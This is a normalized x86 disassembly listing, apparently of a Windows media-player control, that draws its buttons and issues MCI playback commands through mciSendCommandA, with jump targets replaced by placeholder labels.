mov [ ecx + edx * 4 + 0x214 ] eax
push 0x1
mov eax [ edi ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] 0x6
mov eax [ ebp ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] 0x6
lea ecx [ esp + 0x38 ]
mov edx r-xdata
lea eax [ esp + 0x5 ]
call sub_408984
push eax
mov eax [ rw-data ]
push eax
call LoadBitmapA
mov edx eax
xor eax eax
mov al bl
xor ecx ecx
mov cl [ esp ]
add ecx ecx
lea ecx [ esi + ecx * 8 ]
mov eax [ ecx + eax * 4 + 0x214 ]
call sub_420cf8
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ esi + 0x2c0 ]
jle r-xdata
inc [ esp ]
add ebp 0x4
cmp [ esp ] 0x9
jne r-xdata
xor ebx ebx
mov edi rw-data
add [ esi + 0x2c0 ] 0x8
add [ esi + 0x2c4 ] 0x4
add esp 0x44
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45bc10
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x0
xor eax eax
mov al [ esp ]
add eax eax
lea eax [ esi + eax * 8 ]
xor edx edx
mov dl bl
mov eax [ eax + edx * 4 + 0x214 ]
call sub_403258
inc ebx
cmp bl 0x3
jne r-xdata
inc [ esp ]
cmp [ esp ] 0x9
jne r-xdata
xor ebx ebx
pop edx
pop esi
pop ebx
retn
sub_45bc70
push ebx
push ecx
mov [ esp ] dx
mov dx [ esp ]
mov [ eax + 0x2a2 ] dx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x211 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a2 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_45bcb4
push ebx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x213 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a6 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_45bce8
push ebx
push ecx
mov [ esp ] dx
mov dx [ esp ]
mov [ eax + 0x2a4 ] dx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x212 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a4 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_45bd2c
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
mov [ ebx + 0x2a0 ] ax
xor eax eax
setb dl
xor ecx ecx
mov cl al
add ecx ecx
mov [ ebx + ecx * 8 + 0x210 ] dl
inc eax
cmp al 0x9
jne r-xdata
and edx 0x7f
bt [ ebx + 0x2a0 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
test [ ebx + 0x1c ] 0x40
je r-xdata
mov eax ebx
call sub_45bdc4
pop edx
pop ebx
retn
mov eax ebx
call sub_45bd9c
push eax
mov eax [ ebx + 0x48 ]
dec eax
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebx + 0x2bc ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_45bd9c
push esi
xor esi esi
xor edx edx
inc edx
cmp dl 0x9
jne r-xdata
inc esi
xor ecx ecx
mov cl dl
add ecx ecx
cmp [ eax + ecx * 8 + 0x210 ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
inc esi
sub_45bdc4
push ebx
mov ebx eax
mov eax ebx
call sub_45bd9c
mov edx [ ebx + 0x2bc ]
dec edx
imul edx eax
inc edx
mov eax ebx
call sub_4381fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_45bdec
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] edx
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_43d814
test [ ebx + 0x1c ] 0x40
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45bd9c
mov ecx eax
mov eax [ ebx + 0x2c0 ]
dec eax
imul ecx
inc eax
mov [ esp + 0x4 ] eax
mov esi [ ebx + 0x2c4 ]
mov [ esp + 0x8 ] esi
mov eax [ ebx + 0x48 ]
dec eax
cdq
idiv ecx
mov edi eax
inc edi
mov [ ebx + 0x2bc ] edi
mov eax edi
dec eax
imul ecx
inc eax
mov edx [ esp + 0x4 ]
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x4c ]
cmp esi edx
jg r-xdata
mov eax edx
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov esi edx
push eax
push esi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp esi [ ebx + 0x4c ]
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax + 0xc ] edx
sub_45be7c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc4
mov edi ecx
mov [ esp ] dl
mov ebx eax
cmp [ ebx + 0x2a9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esp ]
cmp al [ ebx + 0x2aa ]
je r-xdata
mov [ esp + 0x1 ] al
mov esi [ ebx + 0x208 ]
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41cacc
mov edx 0xff00000f
mov eax [ esi + 0x14 ]
call sub_41c9b0
mov edx 0xff000006
mov eax [ esi + 0x10 ]
call sub_41c6d0
mov edx 0x1
mov eax [ esi + 0x10 ]
call sub_41c7dc
mov eax [ ebx + 0x2bc ]
add eax edi
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
mov edx edi
mov eax esi
call sub_41d118
cmp [ esp + 0x1 ] 0x0
je r-xdata
mov al 0x1
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_41c6d0
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea ebp [ edi + 0x1 ]
mov edx ebp
mov eax esi
call sub_41d0ec
mov edx ebp
mov ecx 0x1
mov eax esi
call sub_41d08c
mov edx [ ebx + 0x2bc ]
add edx edi
dec edx
mov ecx 0x1
mov eax esi
call sub_41d08c
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_41c6d0
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea edx [ edi + 0x2 ]
mov eax esi
call sub_41d0ec
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
mov edx [ ebx + 0x2bc ]
add edx edi
sub edx 0x2
mov eax esi
call sub_41d08c
mov edx [ ebx + 0x2bc ]
add edx edi
sub edx 0x2
mov ecx 0x1
mov eax esi
call sub_41d08c
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_41c6d0
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea ebp [ edi + 0x1 ]
mov edx ebp
mov eax esi
call sub_41d0ec
mov edx ebp
mov ecx 0x1
mov eax esi
call sub_41d08c
mov edx [ ebx + 0x2bc ]
add edx edi
dec edx
mov ecx 0x1
mov eax esi
call sub_41d08c
jmp r-xdata
cmp [ ebx + 0x31c ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
xor eax eax
mov al [ esp ]
mov edx eax
add edx edx
cmp [ ebx + edx * 8 + 0x211 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov al 0x1
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ ebx + edx * 8 + 0x212 ] 0x0
je r-xdata
xor eax eax
mov al [ esp ]
mov edx eax
add edx edx
cmp [ ebx + edx * 8 + 0x213 ] 0x0
je r-xdata
mov edx [ ebx + 0x2bc ]
sar edx 0x1
jns r-xdata
adc eax 0x0
and eax 0x7f
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ ebx + edx * 8 ]
mov ebp [ edx + eax * 4 + 0x214 ]
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
sar eax 0x1
jns r-xdata
mov al 0x2
jmp r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ ebx + edx * 8 + 0x212 ] 0x0
je r-xdata
sub edx eax
mov [ esp + 0x4 ] edx
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov al 0x2
jmp r-xdata
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edx eax
mov [ esp + 0x8 ] edx
cmp [ esp + 0x1 ] 0x0
je r-xdata
adc edx 0x0
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412378
lea eax [ esp + 0x1c ]
push eax
push 0x8080
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ esp + 0x38 ]
push eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
mov eax [ esp + 0x14 ]
add eax edi
mov edx [ esp + 0x18 ]
call sub_4123a0
lea edx [ esp + 0x34 ]
mov ecx ebp
mov eax esi
call sub_41cc20
mov eax ebx
call sub_43f228
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
inc [ esp + 0x4 ]
inc [ esp + 0x8 ]
add esp 0x3c
pop ebp
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ ebx + 0x2e0 ]
jne r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ ebx + 0x2bc ]
xor edx edx
mov eax edi
call sub_4123a0
push 0xfffffffd
push 0xfffffffd
lea eax [ esp + 0x14 ]
push eax
call InflateRect
cmp [ esp + 0x1 ] 0x0
je r-xdata
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d438
push eax
call DrawFocusRect
push 0x1
push 0x1
lea eax [ esp + 0x14 ]
push eax
call OffsetRect
sub_45c178
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x208 ]
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_41cacc
mov eax [ ebx + 0x10 ]
mov edx 0xff000006
call sub_41c6d0
mov eax [ ebx + 0x10 ]
mov edx 0x1
call sub_41c7dc
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41d118
xor edi edi
xor ebx ebx
inc ebx
cmp bl 0x9
jne r-xdata
mov ecx edi
mov edx ebx
mov eax esi
call sub_45be7c
mov eax [ esi + 0x2bc ]
dec eax
add edi eax
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x210 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c1ec
push ebx
mov ebx eax
xor eax eax
mov al dl
cmp eax 0x8
ja r-xdata
pop ebx
retn
jmp [ eax * 4 + jump_table_45c203 ]
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
or [ ebx + 0x2a6 ] 0x80
pop ebx
retn
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
or [ ebx + 0x2a6 ] 0x80
sub_45c414
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
xor edi edi
xor ebx ebx
inc ebx
cmp bl 0x9
jne r-xdata
cmp edi edx
jg r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x210 ] 0x0
je r-xdata
mov eax ebx
mov [ esi + 0x2aa ] al
cmp al [ esi + 0x2e0 ]
je r-xdata
mov eax [ esi + 0x2bc ]
dec eax
add edi eax
mov eax [ esi + 0x2bc ]
add eax edi
cmp edx eax
jg r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x2bc ]
add ecx edi
xor edx edx
mov eax edi
call sub_412378
push esi
push edi
lea edi [ esi + 0x2ab ]
lea esi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x2a8 ] 0x1
mov [ esi + 0x2a9 ] 0x1
mov ecx edi
mov edx ebx
mov eax esi
call sub_45be7c
mov dl 0x1
mov eax esi
call sub_438c78
mov [ esi + 0x2e0 ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp [ esi + 0x31c ] 0x0
je r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x211 ] 0x0
jne r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x213 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45c514
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov edi eax
cmp [ edi + 0x2a8 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
movsx edx [ esi + 0xa ]
movsx eax [ esi + 0x8 ]
call sub_412350
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ edi + 0x2ab ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
mov bl [ edi + 0x2a9 ]
cmp al bl
je r-xdata
xor bl 0x1
mov [ edi + 0x2a9 ] bl
mov ecx [ edi + 0x2ab ]
mov dl [ edi + 0x2aa ]
mov eax edi
call sub_45be7c
sub_45c57c
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x1
mov ecx esp
mov dl [ ebx + 0x2aa ]
mov eax ebx
mov si 0xffb2
call sub_403454
cmp [ esp ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x2aa ]
cmp eax 0x8
ja r-xdata
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_45c63c
jmp [ eax * 4 + jump_table_45c5b6 ]
mov eax ebx
call sub_45ccbc
jmp r-xdata
mov eax ebx
call sub_45cf38
jmp r-xdata
mov eax ebx
call sub_45cea4
jmp r-xdata
mov eax ebx
call sub_45d0cc
jmp r-xdata
mov eax ebx
call sub_45d25c
jmp r-xdata
mov eax ebx
call sub_45d418
jmp r-xdata
mov eax ebx
call sub_45d4f4
jmp r-xdata
mov eax ebx
call sub_45cdcc
jmp r-xdata
mov eax ebx
call sub_45d5b8
sub_45c650
push ebx
push esi
mov ebx eax
xor edx edx
mov eax ebx
call sub_438c78
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
mov [ ebx + 0x2a8 ] 0x0
pop esi
pop ebx
retn
cmp [ ebx + 0x2a9 ] 0x0
je r-xdata
mov [ ebx + 0x2a9 ] 0x0
mov ecx [ ebx + 0x2ab ]
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_45be7c
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_45c57c
cmp [ ebx + 0x31c ] 0x0
je r-xdata
cmp [ ebx + 0x304 ] 0x0
jne r-xdata
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
mov dl [ ebx + 0x2aa ]
mov eax ebx
mov si 0xffb3
call sub_403454
mov eax ebx
call sub_45bcb4
sub_45c6f4
push esi
push edi
mov edi eax
mov ax [ edx ]
sub ax 0x20
je r-xdata
mov al [ edi + 0x2e0 ]
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x211 ] 0x0
je r-xdata
sub ax 0x5
je r-xdata
pop edi
pop esi
retn
mov edx eax
mov [ edi + 0x2aa ] dl
mov eax edi
call sub_45c57c
cmp [ edi + 0x31c ] 0x0
je r-xdata
mov al [ edi + 0x2e0 ]
sub ax 0x2
jne r-xdata
mov dl [ edi + 0x2aa ]
mov eax edi
mov si 0xffb3
call sub_403454
mov eax edi
call sub_45bcb4
test al al
je r-xdata
dec eax
mov al [ edi + 0x2e0 ]
cmp al [ edi + 0x2e0 ]
je r-xdata
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x210 ] 0x0
je r-xdata
cmp al 0x8
je r-xdata
inc eax
mov [ edi + 0x2e0 ] al
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
pop edi
pop esi
retn
test al al
jbe r-xdata
cmp al [ edi + 0x2e0 ]
je r-xdata
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x210 ] 0x0
je r-xdata
mov [ edi + 0x2e0 ] al
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
pop edi
pop esi
retn
cmp al 0x8
jae r-xdata
sub_45c7d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x31c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
dec eax
je r-xdata
mov eax ebx
call sub_45dab8
cmp al 0x1
jne r-xdata
mov [ ebx + 0x308 ] 0x0
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffb0
call sub_403454
pop esi
pop ebx
retn
mov [ ebx + 0x308 ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
mov [ ebx + 0x308 ] 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov eax ebx
call sub_45bcb4
or [ ebx + 0x2a6 ] 0x80
mov [ ebx + 0x308 ] 0x3
jmp r-xdata
sub_45c980
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45cbde
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
xor ecx ecx
mov edx 0x14
call sub_402c64
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov al [ ebx + 0x2f4 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x318 ]
call sub_404450
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_45cbf4
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x2000
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x200
or [ ebx + 0x2e8 ] 0x2000
jmp r-xdata
mov eax ebx
call sub_43f228
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x803
push 0x0
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
je r-xdata
or [ ebx + 0x2e8 ] 0x100
cmp [ ebx + 0x31f ] 0x0
je r-xdata
mov [ ebx + 0x2e1 ] 0x1
mov ax [ ebp - 0x10 ]
mov [ ebx + 0x2f2 ] ax
mov eax ebx
call sub_45da28
mov ecx 0xa
cdq
idiv ecx
mov [ ebx + 0x300 ] eax
mov eax ebx
call sub_45d894
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_45db84
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
mov al [ ebx + 0x2f4 ]
cmp al 0x2
je r-xdata
mov edx [ ebx + 0x30c ]
mov eax ebx
call sub_45d72c
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_45d840
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
mov [ ebx + 0x310 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ ebx + 0x314 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cbe5
lea eax [ ebp - 0x28 ]
call sub_403f90
retn
mov dl 0xa
mov eax ebx
call sub_45d6f0
cmp al 0xb
jne r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a6 ] ax
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x80
mov eax ebx
call sub_45dab8
cmp al 0x2
jne r-xdata
or [ ebx + 0x2a6 ] 0x100
mov eax ebx
call sub_45bcb4
xor edx edx
mov eax ebx
mov si 0xffb3
call sub_403454
sub_45cbf4
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x2f2 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x804
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2e1 ] 0x0
mov [ ebx + 0x2f2 ] 0x0
mov ax [ r-xdata ]
mov [ ebx + 0x2a6 ] ax
mov eax ebx
call sub_45bcb4
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_45ccbc
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_45c874
cmp [ ebx + 0x31e ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_45dafc
mov esi eax
mov eax ebx
call sub_45da28
cmp esi eax
jne r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
cmp [ ebx + 0x2f0 ] 0x0
jne r-xdata
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2f1 ] 0x0
jne r-xdata
cmp [ ebx + 0x2f1 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x4
mov eax [ ebx + 0x2fc ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2ee ] 0x0
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_45d664
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x806
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop esi
pop ebx
retn
or [ ebx + 0x2e8 ] 0x8
mov eax [ ebx + 0x2f8 ]
mov [ esp + 0x8 ] eax
mov [ ebx + 0x2f1 ] 0x0
sub_45cdcc
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_45c874
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2f1 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x4
mov eax [ ebx + 0x2fc ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2ee ] 0x0
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80f
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop ebx
retn
or [ ebx + 0x2e8 ] 0x8
mov eax [ ebx + 0x2f8 ]
mov [ esp + 0x8 ] eax
mov [ ebx + 0x2f1 ] 0x0
sub_45cea4
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_45c874
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x808
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
pop edx
pop ebx
retn
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_45cf38
push ebx
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
jne r-xdata
mov eax ebx
call sub_45dab8
cmp al 0x2
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
mov eax ebx
call sub_45dab8
cmp al 0x5
jne r-xdata
mov eax ebx
call sub_45cf84
pop ebx
retn
pop ebx
retn
mov eax ebx
